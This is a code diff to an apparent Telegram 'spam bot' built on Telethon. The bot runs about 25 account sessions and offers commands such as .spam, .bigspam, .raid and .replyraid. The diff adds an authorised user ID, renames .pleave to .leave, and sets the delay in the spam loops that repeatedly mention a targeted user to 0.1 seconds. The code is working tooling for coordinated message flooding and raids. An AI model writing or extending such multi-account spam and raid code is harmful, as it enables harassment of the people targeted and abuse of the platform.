@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = [2020051281]
+SMEX_USERS = [2020051281, 5120382261]
 for x in SUDO_USERS: 
     SMEX_USERS.append(x)
     
@@ -884,31 +884,31 @@ async def _(e):
             await e.reply(usage, parse_mode=None, link_preview=None )
             
         
-@idk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@ydk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@wdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@hdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@sdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@adk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@bdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@cdk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@edk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@ddk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@vkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@kkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@lkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@mkk.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@sid.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@shy.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@aan.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@ake.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@eel.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@khu.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@shi.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@yaa.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@dav.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@raj.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
-@put.on(events.NewMessage(incoming=True, pattern=r"\.pleave"))
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@vkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@kkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@lkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@mkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@sid.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@shy.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@aan.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@ake.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@eel.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@khu.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@shi.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@yaa.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@dav.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@raj.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
+@put.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
 
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
@@ -1158,7 +1158,7 @@ async def spam(e):
                 caption = f"{username} {reply}"
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, caption)
-                    await asyncio.sleep(0.0)
+                    await asyncio.sleep(0.1)
         elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
             b = await e.client.get_entity(a.sender_id)
@@ -1171,7 +1171,7 @@ async def spam(e):
                 caption = f"{username} {reply}"
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, caption)
-                    await asyncio.sleep(0.0)
+                    await asyncio.sleep(0.1)
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
 
@@ -1483,7 +1483,7 @@ async def restart(e):
 
 async def help(e):
     if e.sender_id in SMEX_USERS:
-       text = " ⚔️ 🇧 🇦 🇦 🇵  🇯 🇮 🇮 Տᑭᗩᗰ ᗷOT ⚔️\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\nᑌՏᗴᖇᗷOT ᑕOᗰᗰᗩᑎᗪՏ:\n.bio\n.join\n.pjoin\n.pleave\n\nՏᑭᗩᗰ ᑕOᗰᗰᗩᑎᗪՏ:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
+       text = " ⚔️ 🇧 🇦 🇦 🇵  🇯 🇮 🇮 Տᑭᗩᗰ ᗷOT ⚔️\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\nᑌՏᗴᖇᗷOT ᑕOᗰᗰᗩᑎᗪՏ:\n.bio\n.join\n.pjoin\n.leave\n\nՏᑭᗩᗰ ᑕOᗰᗰᗩᑎᗪՏ:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
        await e.reply(text, parse_mode=None, link_preview=None )
 
         
